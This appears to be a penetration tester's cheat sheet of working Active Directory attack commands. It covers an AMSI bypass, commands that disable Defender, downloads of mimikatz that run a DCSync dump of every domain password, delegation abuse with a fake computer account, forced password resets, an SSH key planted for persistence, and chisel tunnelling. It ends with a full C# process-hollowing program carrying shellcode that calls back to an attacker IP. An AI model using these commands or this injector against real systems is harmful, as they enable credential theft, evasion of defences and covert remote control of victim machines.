Run on DC, to dump all user’s password (DCSync rights).

```bash
(new-object system.net.webclient).downloadstring('http://$kali_ip/amsi.txt') | IEX

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true

cd \windows\tasks

certutil -urlcache -split -f http://$kali_ip/mimikatz.exe

.\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.com /all /csv" "exit"
```

### Disable Antivirus (AV)

PowerShell version.

```bash
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
```

Command Prompt version.

```bash
cd "\Program Files\Windows Defender"
```

```bash
MsMpEng -RemoveDefinitions All
```

### Add Fake Computer (using PowerMad) - GenericWrite Abuse

```bash
git clone https://github.com/Kevin-Robertson/Powermad
```

CreateFakeComputer.ps1

```bash
(new-object system.net.webclient).downloadstring('http://$kali_ip/Powermad.ps1') | IEX
(new-object system.net.webclient).downloadstring('http://$kali_ip/pvieww.ps1') | IEX
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'P@ssw0rd' -AsPlainText -Force)
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"
$SDbytes = New-Object byte[] ($SD.BinaryLength) 
$SD.GetBinaryForm($SDbytes,0)
Get-DomainComputer -Identity ??? | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
$RBCDbytes = Get-DomainComputer JUMP09 -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RBCDbytes, 0
$Descriptor.DiscretionaryAcl
```

```bash
(new-object system.net.webclient).downloadstring('http://$kali_ip/amsi.txt') | IEX

(new-object system.net.webclient).downloadstring('http://$kali_ip/CreateFakeComputer.ps1') | IEX
```

Then we can start requesting for tickets and psexec.

```bash
proxychains python3 impacket/examples/getST.py -spn CIFS/???.domain.com -impersonate 'administrator' -dc-ip $dc_ip domain.com/myComputer:'P@ssw0rd'

export KRB5CCNAME=/var/www/html/administrator@???.ccache

proxychains python3 impacket/examples/psexec.py 'administrator'@???.domain.com -k -no-pass
```

### Get Hostname:IP Mapping in the Domain

```bash
Get-ADComputer -Filter * -properties * | select Name,Enabled,ipv4address,ObjectGUID,SamAccountName,SID,DistinguishedName,DNSHostName,ObjectClass
```

### RDP

```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

```bash
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
```

```bash
rdesktop $ip -u'?' -p'?' -d '?'
```

### Chisel

```bash
./chisel server -p 8080 --reverse
```

```bash
cd \windows\tasks

(new-object system.net.webclient).downloadstring('http://$kali_ip/amsi.txt') | IEX

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true

certutil -urlcache -split -f http://$kali_ip/chisel.exe

.\chisel.exe client $kali_ip:8080 R:socks
```

### ForceChangePassword

```bash
git clone https://github.com/CravateRouge/bloodyAD

proxychains python bloodyAD.py --host $ip -d "domain.com" -u "$adminuser" -p "???" set password $target_user P@ssw0rd
```

### Service Abuse

```bash
(New-Object System.Net.WebClient).DownloadString('http://$kali_ip/amsi.txt') | IEX

(New-Object System.Net.WebClient).DownloadString('http://$kali_ip/PowerUp.ps1') | IEX

Invoke-ServiceAbuse -ServiceName '???'
```

### Persistent SSH Access (and SSHUTTLE)

On Kali:

```bash
cat /root/.ssh/id_ed25519.pub
```

On Victim:

```bash
mkdir /root/.ssh && echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHq3GWzHwtG0dMvNcf5FjsIJGYBB5ziL9eY+Djq5ewAt root@kali" >> /root/.ssh/authorized_keys
```

Now we can use sshuttle.

```bash
proxychains sshuttle -vr $ip ???.???.???.0/24
```

### TCPDump capture ping packets (ICMP)

```bash
tcpdump ip proto \\icmp -i tun0
```

### Hollowing Script

```bash
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;

namespace Hollow
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved; 
            public IntPtr lpDesktop; 
            public IntPtr lpTitle; 
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars; 
            public Int32 dwYCountChars; 
            public Int32 dwFillAttribute; 
            public Int32 dwFlags;
            public Int16 wShowWindow; 
            public Int16 cbReserved2;
            public IntPtr lpReserved2; 
            public IntPtr hStdInput;
            public IntPtr hStdOutput; 
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId; 
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1; 
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)] 
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO(); 
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            byte[] buf = new byte[599] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
                0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
                0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
                0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,
                0x01,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,
                0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,
                0x8b,0x48,0x18,0x8b,0x58,0x20,0x50,0x01,0xd3,0x85,0xc9,0x74,
                0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xc1,
                0xcf,0x0d,0xac,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,
                0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,
                0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
                0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
                0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
                0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,
                0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,
                0x53,0xe8,0x54,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,
                0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x4d,0x61,0x63,0x69,0x6e,
                0x74,0x6f,0x73,0x68,0x3b,0x20,0x49,0x6e,0x74,0x65,0x6c,0x20,
                0x4d,0x61,0x63,0x20,0x4f,0x53,0x20,0x58,0x20,0x31,0x34,0x2e,
                0x34,0x3b,0x20,0x72,0x76,0x3a,0x31,0x32,0x34,0x2e,0x30,0x29,
                0x20,0x47,0x65,0x63,0x6b,0x6f,0x2f,0x32,0x30,0x31,0x30,0x30,
                0x31,0x30,0x31,0x20,0x46,0x69,0x72,0x65,0x66,0x6f,0x78,0x2f,
                0x31,0x32,0x34,0x2e,0x30,0x00,0x68,0x3a,0x56,0x79,0xa7,0xff,
                0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,
                0xe8,0x19,0x01,0x00,0x00,0x2f,0x4d,0x56,0x61,0x73,0x75,0x72,
                0x36,0x30,0x52,0x71,0x72,0x6f,0x4d,0x4f,0x6b,0x78,0x6a,0x70,
                0x4b,0x48,0x66,0x41,0x32,0x4e,0x41,0x4a,0x58,0x37,0x59,0x64,
                0x55,0x64,0x7a,0x71,0x78,0x6d,0x66,0x74,0x78,0x43,0x61,0x56,
                0x49,0x72,0x30,0x65,0x63,0x54,0x57,0x56,0x48,0x32,0x5a,0x45,
                0x75,0x72,0x39,0x62,0x74,0x6c,0x73,0x30,0x69,0x75,0x35,0x42,
                0x47,0x62,0x43,0x4d,0x56,0x6e,0x62,0x38,0x4e,0x33,0x79,0x61,
                0x66,0x6b,0x31,0x6a,0x58,0x56,0x41,0x67,0x61,0x67,0x70,0x7a,
                0x41,0x59,0x32,0x74,0x49,0x78,0x49,0x31,0x6d,0x47,0x42,0x50,
                0x6b,0x35,0x51,0x38,0x75,0x68,0x4c,0x4b,0x65,0x36,0x76,0x78,
                0x49,0x6c,0x77,0x6d,0x41,0x6a,0x5f,0x39,0x5a,0x57,0x64,0x76,
                0x6b,0x78,0x6b,0x74,0x4c,0x45,0x4d,0x37,0x41,0x42,0x00,0x50,
                0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,
                0x32,0xe8,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,
                0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,
                0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,
                0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,
                0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x00,
                0x00,0x68,0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,
                0x4b,0x00,0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,
                0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,
                0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,
                0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,
                0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,
                0x6b,0xff,0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,
                0x34,0x35,0x2e,0x31,0x35,0x34,0x00,0xbb,0xf0,0xb5,0xa2,0x56,
                0x6a,0x00,0x53,0xff,0xd5};

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
```
